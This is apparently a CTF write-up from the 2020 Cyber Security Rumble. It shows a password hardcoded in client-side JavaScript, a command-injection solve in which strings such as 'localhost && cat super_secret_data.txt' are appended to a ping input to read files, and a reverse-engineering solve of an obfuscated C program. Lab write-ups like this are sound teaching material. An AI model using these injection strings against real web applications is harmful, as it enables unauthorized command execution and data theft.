## Table of Contents
**[Summary](#summary)**<br>
**[Cyberwall](#cyberwall)**<br>
**[Zeh](#zeh)**<br>
**[Hashfun](#hashfun)**<br>
**[Wheels n Whales](#wheels-n-whales)**<br>


## Summary

https://ctf.cybersecurityrumble.de/

Team: Lockdown4Co19vid

Placement: 64th out of about 500 scoring teams

Notes: First CTF

Software Used:



## Cyberwall
We are greeted with a login screen that asks the user for their password. The `Lost Password` button just sends an alert to the browser.

![login](https://github.com/NKeil/ctf_writeups/blob/main/2020_cyber_security_rumble_germany/images/login.png?raw=true)

Taking a look at the HTML file, we find that JavaScript code is imbedded to validate the password input, which gives us the password in plain text.

```
function checkPw() {
  var pass = document.getElementsByName('passwd')[0].value;
  if (pass != "rootpw1337") {
    alert("This Password is invalid!");
    return false;
  }
  window.location.replace("management.html");
}
```

After we login, we find links to 5 pages, 4 of which have just text and images. The 5th however, has an input box to `Test Host Connection` by inputting an argument to `ping`. 

![ping](https://github.com/NKeil/ctf_writeups/blob/main/2020_cyber_security_rumble_germany/images/ping.png?raw=true)

Since our input is being used in the form `ping [input]`, we can test the website's leniency of accepted inputs by appending another command after the hostname such as `localhost && ls -l`, which successfully gives us the output:

```
-rw-r--r-- 1 root root   16 Oct 15 12:49 requirements.txt
drwxr-xr-x 3 root root 4096 Oct 15 12:49 static
-rw-r--r-- 1 root root   85 Oct 15 12:49 super_secret_data.txt
drwxr-xr-x 2 root root 4096 Oct 15 12:49 templates
-rw-r--r-- 1 root root 1070 Oct 15 12:49 webapp.py
-rw-r--r-- 1 root root   23 Oct 15 12:49 wsgi.py
```

We now can read the file `super_secret_data.txt` with the input `localhost && cat super_secret_data.txt`, giving us the flag
```
CSR{oh_damnit_should_have_banned_curl_https://news.ycombinator.com/item?id=19507225}
```

## Zeh

In this challenge, we are given the following text file:

```
#include <stdio.h>
#include <stdlib.h>
#include "fahne.h"

#define Hauptroutine main
#define nichts void
#define Ganzzahl int
#define schleife(n) for (Ganzzahl i = n; i--;)
#define bitrverschieb(n, m) (n) >> (m)
#define diskreteAddition(n, m) (n) ^ (m)
#define wenn if
#define ansonsten else
#define Zeichen char
#define Zeiger *
#define Referenz &
#define Ausgabe(s) puts(s)
#define FormatAusgabe printf
#define FormatEingabe scanf
#define Zufall rand()
#define istgleich =
#define gleichbedeutend ==

nichts Hauptroutine(nichts) {
    Ganzzahl i istgleich Zufall;
    Ganzzahl k istgleich 13;
    Ganzzahl e;
    Ganzzahl Zeiger p istgleich Referenz i;

    FormatAusgabe("%d\n", i);
    fflush(stdout);
    FormatEingabe("%d %d", Referenz k, Referenz e);

    schleife(7)
        k istgleich bitrverschieb(Zeiger p, k % 3);

    k istgleich diskreteAddition(k, e);

    wenn(k gleichbedeutend 53225)
        Ausgabe(Fahne);
    ansonsten
        Ausgabe("War wohl nichts!");
}
```
along with a netcat link that runs the script. Filling in the #define 's, and adding some print statements, we are left with an easier to follow program:

```
#include <stdio.h>
#include <stdlib.h>

void main(void) {
    char* flag = "????";
    int i = rand();
    int k = 13;
    int e;
    int *p = &i;

    printf("%d\n", i);
    fflush(stdout);
    scanf("%d %d", &k, &e);

    for (int i = 7; i--;) {
        k = *p >> (k % 3);
	printf("%d\n", k);
}

    k = k ^ e;

    if(k == 53225)
        puts(flag);
    else
        puts("That was nothing!");
}
```
Our task is now to reverse engineer this algorithm to find a valid input for `k` and `e` such that by the end, `k == 53225`. Running this program, we see that `i` is set to the same value every time. This allows us to simply pick a `k`, see what it outputs at the end of the for loop, and then generating an `e` such that `k ^ e = 53225`. For instance, if `k = 2` initially, then at the end of the for loop, `k = 1804289383`. We can run `1804289383 ^ 53225` to get  `e = 1804307086`. We now input these numbers into the server to get the flag.

## Hashfun
## Wheels n Whales
